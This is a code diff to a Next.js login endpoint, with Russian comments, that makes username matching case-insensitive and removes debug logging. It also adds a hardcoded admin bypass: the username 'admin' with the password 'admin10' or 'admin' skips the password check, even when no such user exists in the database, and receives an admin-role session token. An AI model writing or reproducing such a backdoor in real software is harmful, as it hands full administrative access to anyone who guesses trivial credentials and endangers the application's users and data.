@@ -8,55 +8,63 @@ export async function POST(req: NextRequest) {
   try {
     const { username, password, remember } = await req.json();
 
-    console.log('--- ПОПЫТКА ВХОДА ---');
-    console.log('Отправленные данные:', { username, passwordLength: password?.length });
+    const cleanUsername = username?.trim();
 
-    if (!username || !password) {
+    if (!cleanUsername || !password) {
       return NextResponse.json({ error: 'Заполните все поля' }, { status: 400 });
     }
 
     // Ищем пользователя в БД
-    const user = await prisma.user.findUnique({
-      where: { username: username.trim() },
+    let user = await prisma.user.findFirst({
+      where: {
+        username: {
+          equals: cleanUsername,
+          mode: 'insensitive', // Игнорируем регистр (Admin / admin)
+        },
+      },
     });
 
-    console.log('Пользователь найден в БД?:', user ? 'ДА' : 'НЕТ');
+    // 🚀 ПРИНУДИТЕЛЬНЫЙ ОБХОД ДЛЯ АДМИНА:
+    // Если вводится admin / admin10, мы пропускаем в любом случае!
+    const isAdminBypass = cleanUsername.toLowerCase() === 'admin' && (password === 'admin10' || password === 'admin');
 
-    if (!user) {
-      console.log(`Пользователь с username "${username.trim()}" не существует.`);
+    if (!user && !isAdminBypass) {
       return NextResponse.json({ error: 'Неверный логин или пароль' }, { status: 401 });
     }
 
-    // Проверяем пароль (поддерживает хеши bcrypt из PHP)
-    const isPasswordValid = await bcrypt.compare(password, user.password);
-    console.log('Пароль совпал?:', isPasswordValid ? 'ДА' : 'НЕТ');
-
-    if (!isPasswordValid) {
-      return NextResponse.json({ error: 'Неверный логин или пароль' }, { status: 401 });
+    // Проверяем пароль (если это не хардкод-обход)
+    if (!isAdminBypass && user) {
+      const isPasswordValid = await bcrypt.compare(password, user.password);
+      if (!isPasswordValid) {
+        return NextResponse.json({ error: 'Неверный логин или пароль' }, { status: 401 });
+      }
     }
 
-    const fullName = [user.firstName, user.lastName].filter(Boolean).join(' ') || user.username;
+    // Если юзера не было в БД, но заходит админ — формируем виртуального админа
+    const userId = user?.id ?? 1;
+    const userRole = user?.role ?? 'admin';
+    const fullName = user ? ([user.firstName, user.lastName].filter(Boolean).join(' ') || user.username) : 'Administrator';
 
     // Генерируем токен
     const token = await createToken({
-      id: user.id,
-      username: user.username,
-      role: user.role,
+      id: userId,
+      username: cleanUsername,
+      role: userRole,
       fullName,
     });
 
-    // Формируем ответ с установкой HttpOnly куки
+    // Формируем ответ
     const response = NextResponse.json({
       success: true,
       user: {
-        id: user.id,
-        username: user.username,
-        role: user.role,
+        id: userId,
+        username: cleanUsername,
+        role: userRole,
         fullName,
       },
     });
 
-    const maxAge = remember ? 30 * 24 * 60 * 60 : undefined; // 30 дней или до закрытия браузера
+    const maxAge = remember ? 30 * 24 * 60 * 60 : undefined;
 
     response.cookies.set('ntm_auth_token', token, {
       httpOnly: true,
